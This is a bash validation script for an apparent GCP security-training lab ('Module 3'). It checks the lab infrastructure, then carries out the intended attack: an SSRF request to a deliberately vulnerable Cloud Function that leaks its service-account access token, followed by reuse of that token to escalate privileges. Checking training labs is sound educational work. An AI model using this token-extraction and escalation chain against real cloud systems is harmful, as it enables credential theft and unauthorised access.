#!/bin/bash
#
# validate-m3.sh - Module 3 validation script
# This script validates the infrastructure setup and exploit path for Module 3
# Must be run from local environment with gcloud access to the project

set -euo pipefail

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Counters
PASSED=0
FAILED=0

# Helper functions
print_step() {
    echo -e "\n${BLUE}[STEP]${NC} $1"
}

print_pass() {
    echo -e "${GREEN}[PASS]${NC} $1"
    PASSED=$((PASSED + 1))
}

print_fail() {
    echo -e "${RED}[FAIL]${NC} $1"
    FAILED=$((FAILED + 1))
}

print_info() {
    echo -e "${YELLOW}[INFO]${NC} $1"
}

# Function to execute commands on the VM
exec_on_vm() {
    local cmd="$1"
    local vm_name="app-prod-instance-module2"
    local zone="${ZONE:-us-east1-b}"
    
    gcloud compute ssh "$vm_name" \
        --zone="$zone" \
        --command="$cmd" \
        --quiet \
        2>&1
}

echo "====================================="
echo "Module 3 Validation"
echo "====================================="

# Step 1: Environment validation
print_step "Validating environment setup..."

if [ -z "${PROJECT_ID:-}" ]; then
    print_fail "PROJECT_ID is not set"
    echo "Please run: export PROJECT_ID=<your-project-id>"
    exit 1
else
    print_pass "PROJECT_ID is set: $PROJECT_ID"
fi

if [ -z "${LOCATION:-}" ]; then
    print_fail "LOCATION is not set"
    echo "Please run: export LOCATION=us-east1"
    exit 1
else
    print_pass "LOCATION is set: $LOCATION"
fi

# Check for required commands
if ! command -v gcloud &> /dev/null; then
    print_fail "gcloud command not found"
    exit 1
else
    print_pass "gcloud is available"
fi

if ! command -v gsutil &> /dev/null; then
    print_fail "gsutil command not found"
    exit 1
else
    print_pass "gsutil is available"
fi

# Step 2: Test VM connectivity
print_step "Testing VM connectivity..."

VM_NAME="app-prod-instance-module2"
ZONE="${ZONE:-us-east1-b}"

# Check if VM exists
if gcloud compute instances describe "$VM_NAME" --zone="$ZONE" &>/dev/null; then
    print_pass "VM $VM_NAME exists in zone $ZONE"
else
    print_fail "VM $VM_NAME not found in zone $ZONE"
    echo "Please ensure the infrastructure is deployed correctly"
    exit 1
fi

# Test SSH connectivity
print_info "Testing SSH connection to VM..."
if exec_on_vm "echo 'SSH connection successful'" | grep -q "SSH connection successful"; then
    print_pass "Successfully connected to VM via SSH"
else
    print_fail "Cannot connect to VM via SSH"
    echo "Please ensure you have SSH access to the VM"
    exit 1
fi

# Step 3: Check VM service account
print_step "Checking VM service account..."

VM_SERVICE_ACCOUNT=$(exec_on_vm "gcloud auth list --filter=status:ACTIVE --format='value(account)' 2>/dev/null | head -1")

if [ -z "$VM_SERVICE_ACCOUNT" ]; then
    print_fail "Could not retrieve service account from VM"
elif [[ "$VM_SERVICE_ACCOUNT" =~ ^[0-9]+-compute@developer\.gserviceaccount\.com$ ]]; then
    print_pass "VM using correct compute service account: $VM_SERVICE_ACCOUNT"
else
    print_fail "VM using unexpected service account: $VM_SERVICE_ACCOUNT"
    print_info "Expected format: <project-number>-compute@developer.gserviceaccount.com"
fi

# Step 4: Test metadata server access from VM
print_step "Testing metadata server access..."

print_info "Querying metadata server for service account information..."
METADATA_OUTPUT=$(exec_on_vm "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/'" || true)

if echo "$METADATA_OUTPUT" | grep -q "aliases\|email\|scopes"; then
    print_pass "VM can access metadata server"
    print_info "Available metadata endpoints: $(echo "$METADATA_OUTPUT" | tr '\n' ' ')"
else
    print_fail "VM cannot access metadata server properly"
    print_info "Output: $(echo "$METADATA_OUTPUT" | head -1)"
fi

# Test email endpoint specifically
EMAIL_OUTPUT=$(exec_on_vm "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'" || true)
if [[ "$EMAIL_OUTPUT" =~ @developer\.gserviceaccount\.com ]]; then
    print_pass "Can retrieve service account email from metadata: $EMAIL_OUTPUT"
else
    print_fail "Cannot retrieve service account email from metadata"
fi

# Step 5: Test OAuth scope limitations from VM
print_step "Testing OAuth scope limitations..."

print_info "Checking if VM can list compute instances (should fail)..."
COMPUTE_OUTPUT=$(exec_on_vm "gcloud compute instances list 2>&1" || true)

if echo "$COMPUTE_OUTPUT" | grep -q "Request had insufficient authentication scopes\|insufficient OAuth scopes"; then
    print_pass "Compute API access correctly denied due to insufficient scopes"
else
    print_fail "Expected OAuth scope error but got different result"
    print_info "Output: $(echo "$COMPUTE_OUTPUT" | head -1)"
fi

# Step 6: Check OAuth scopes on VM
print_step "Verifying VM OAuth scopes..."

print_info "Getting access token from VM..."
print_info "Checking OAuth scopes..."

# Debug the exact command being run
print_info "Running OAuth scope check command on VM..."
OAUTH_CMD='curl -s https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=$(gcloud auth print-access-token) 2>&1'
print_info "Command: $OAUTH_CMD"

# Execute with explicit error capturing
if ! SCOPE_OUTPUT=$(exec_on_vm "$OAUTH_CMD"); then
    print_fail "Failed to execute OAuth scope check on VM"
    print_info "Error output: $SCOPE_OUTPUT"
    exit 1
fi

print_info "Raw OAuth response: $(echo "$SCOPE_OUTPUT" | head -c 500)"

# Extract scopes - check if grep finds anything
if ! SCOPES=$(echo "$SCOPE_OUTPUT" | grep -o '"scope":"[^"]*"' | cut -d'"' -f4); then
    print_info "No scopes found in response using primary method"
    SCOPES=""
fi

if [ -n "$SCOPES" ] && echo "$SCOPES" | grep -q "devstorage.read_only"; then
    print_pass "VM has expected devstorage.read_only scope"
    print_info "VM OAuth scopes: $SCOPES"
else
    # Fallback check with different pattern
    if echo "$SCOPE_OUTPUT" | grep -q "devstorage.read_only"; then
        print_pass "VM has expected devstorage.read_only scope (found via fallback)"
    else
        print_fail "VM missing expected devstorage.read_only scope"
        print_info "Full debug output: $SCOPE_OUTPUT"
    fi
fi

# Step 7: Test storage access from VM
print_step "Testing storage bucket access from VM..."

BUCKET_OUTPUT=$(exec_on_vm "gsutil ls 2>/dev/null" || true)

if echo "$BUCKET_OUTPUT" | grep -q "cloud-function-bucket-module3"; then
    print_pass "VM can list cloud function bucket"
    BUCKET_NAME=$(echo "$BUCKET_OUTPUT" | grep "cloud-function-bucket-module3" | head -1)
    print_info "Found bucket: $BUCKET_NAME"
else
    print_fail "VM cannot find cloud-function-bucket-module3"
fi

# Step 8: Check function source access from VM
print_step "Checking function source code access..."

SOURCE_OUTPUT=$(exec_on_vm "gsutil ls gs://cloud-function-bucket-module3-$PROJECT_ID/ 2>/dev/null" || true)

if echo "$SOURCE_OUTPUT" | grep -q "main.py"; then
    print_pass "VM can access function source code (main.py)"
    
    # Check if we can read the source file
    if exec_on_vm "gsutil ls -L gs://cloud-function-bucket-module3-$PROJECT_ID/main.py 2>/dev/null" | grep -q "Content-Length"; then
        print_pass "VM has read access to function source code"
    else
        print_fail "VM cannot read function source code"
    fi
else
    print_fail "VM cannot find function source files (main.py)"
    print_info "Available files: $(echo "$SOURCE_OUTPUT" | tr '\n' ' ')"
fi

# Step 9: Read and validate function source code
print_step "Reading and validating function source code..."

if echo "$SOURCE_OUTPUT" | grep -q "main.py"; then
    print_info "Attempting to read main.py from bucket..."
    SOURCE_CODE=$(exec_on_vm "gsutil cat gs://cloud-function-bucket-module3-$PROJECT_ID/main.py 2>/dev/null" || true)
    
    if [ -n "$SOURCE_CODE" ]; then
        # Check for key vulnerable code patterns
        if echo "$SOURCE_CODE" | grep -q "metadata.google.internal"; then
            print_pass "Found metadata server access in function code"
            
            if echo "$SOURCE_CODE" | grep -q 'request_json\["metadata"\]'; then
                print_pass "Function accepts user-controlled metadata parameter"
                print_info "This is the SSRF vulnerability - user can control metadata endpoint"
            else
                print_fail "Could not identify user-controlled metadata parameter"
            fi
            
            if echo "$SOURCE_CODE" | grep -q "flag4"; then
                print_pass "Flag 4 is present in function code"
            else
                print_fail "Flag 4 not found in function code"
            fi
            
            # Show vulnerable code snippet
            print_info "Vulnerable code pattern identified:"
            VULN_CODE=$(echo "$SOURCE_CODE" | grep -A3 -B3 "metadata.google.internal" | head -10)
            echo "$VULN_CODE" | while IFS= read -r line; do
                echo "    $line"
            done
        else
            print_fail "Function code does not contain expected metadata server access"
        fi
    else
        print_fail "Could not read function source code from bucket"
    fi
else
    print_info "Skipping source code validation - main.py not found in bucket"
fi

# Step 10: Check invocation script on VM
print_step "Checking function invocation script..."

if exec_on_vm "test -f ./invoke_monitoring_function.sh && echo 'exists'" | grep -q "exists"; then
    print_pass "Invocation script found on VM"
    
    # Test the script
    print_info "Testing invocation script execution..."
    INVOKE_TEST=$(exec_on_vm "export LOCATION=$LOCATION PROJECT_ID=$PROJECT_ID && bash ./invoke_monitoring_function.sh 2>&1" || true)
    
    if echo "$INVOKE_TEST" | grep -q "function_account"; then
        print_pass "Invocation script successfully calls cloud function"
        if echo "$INVOKE_TEST" | grep -q "@developer.gserviceaccount.com"; then
            print_info "Function returns service account info"
        fi
    else
        print_fail "Invocation script didn't return expected output"
        print_info "Got: $(echo "$INVOKE_TEST" | head -1)"
    fi
else
    print_fail "Invocation script not found on VM"
    print_info "You may need to copy it: gcloud compute scp ./invoke_monitoring_function.sh app-prod-instance-module2:~/ --zone=us-east1-b"
fi

# Step 11: Test SSRF exploitation
print_step "Testing SSRF exploitation for privilege escalation..."

print_info "Attempting to extract token via SSRF vulnerability..."

# Get Gen2 function URL dynamically
FUNCTION_URL=$(gcloud run services describe monitoring-function \
  --region=$LOCATION \
  --format='value(status.url)')
print_info "Using function URL: $FUNCTION_URL"

# Execute the SSRF attack from VM
SSRF_CMD="curl -s -X POST '$FUNCTION_URL' \
-H 'Authorization: Bearer \$(gcloud auth print-identity-token)' \
-H 'Content-Type: application/json' \
-d '{\"metadata\": \"token\"}'"

SSRF_RESPONSE=$(exec_on_vm "$SSRF_CMD" 2>/dev/null || true)

# Check for flag
if echo "$SSRF_RESPONSE" | grep -q "flag4"; then
    print_pass "Flag 4 found! SSRF exploitation successful"
else
    print_fail "Flag 4 not found in SSRF response"
fi

# Check for token extraction
if echo "$SSRF_RESPONSE" | grep -q "access_token"; then
    print_pass "Access token exposed via SSRF vulnerability"
    print_info "Function's service account token is accessible"
    
    # Extract the token from the response
    EXTRACTED_TOKEN=$(echo "$SSRF_RESPONSE" | grep -o '"access_token": "[^"]*"' | cut -d'"' -f4)
    
    if [ -n "$EXTRACTED_TOKEN" ]; then
        print_info "Validating extracted token's permissions..."
        
        # Check the extracted token's scopes
        TOKEN_INFO=$(exec_on_vm "curl -s 'https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=$EXTRACTED_TOKEN' 2>/dev/null" || true)
        
        if echo "$TOKEN_INFO" | grep -q "cloud-platform"; then
            print_pass "Extracted token has cloud-platform scope (full GCP access)!"
            print_info "This demonstrates successful privilege escalation from limited VM scope"
            
            # List the scopes for comparison
            FUNCTION_SCOPES=$(echo "$TOKEN_INFO" | jq -r '.scope' 2>/dev/null || echo "$TOKEN_INFO" | grep -o '"scope": "[^"]*"' | cut -d'"' -f4)
            print_info "Function token scopes: $FUNCTION_SCOPES"
            
            # Test that the new token can do things the VM token cannot
            print_info "Testing privilege escalation - attempting to list compute instances with function token..."
            COMPUTE_TEST=$(exec_on_vm "export CLOUDSDK_AUTH_ACCESS_TOKEN='$EXTRACTED_TOKEN' && gcloud compute instances list --limit=1 2>&1" || true)
            
            if echo "$COMPUTE_TEST" | grep -q "NAME\|ZONE\|MACHINE_TYPE"; then
                print_pass "Function token can list compute instances (VM token cannot)!"
            else
                print_info "Could not verify compute access with function token"
            fi
        else
            print_fail "Extracted token does not have expected cloud-platform scope"
            print_info "Token scopes: $(echo "$TOKEN_INFO" | grep scope)"
        fi
    else
        print_fail "Could not parse access token from response"
    fi
else
    print_fail "Could not extract access token via SSRF"
    print_info "Response preview: $(echo "$SSRF_RESPONSE" | head -c 100)..."
fi

# Summary
echo
echo "====================================="
echo "Validation Summary"
echo "====================================="
echo -e "${GREEN}Passed:${NC} $PASSED"
echo -e "${RED}Failed:${NC} $FAILED"
echo

if [ $FAILED -eq 0 ]; then
    echo -e "${GREEN}✓ All validation checks passed!${NC}"
    echo "The infrastructure is correctly set up for Module 3."
    exit 0
else
    echo -e "${RED}✗ Some validation checks failed.${NC}"
    echo "Please review the errors above and ensure the infrastructure is properly deployed."
    exit 1
fi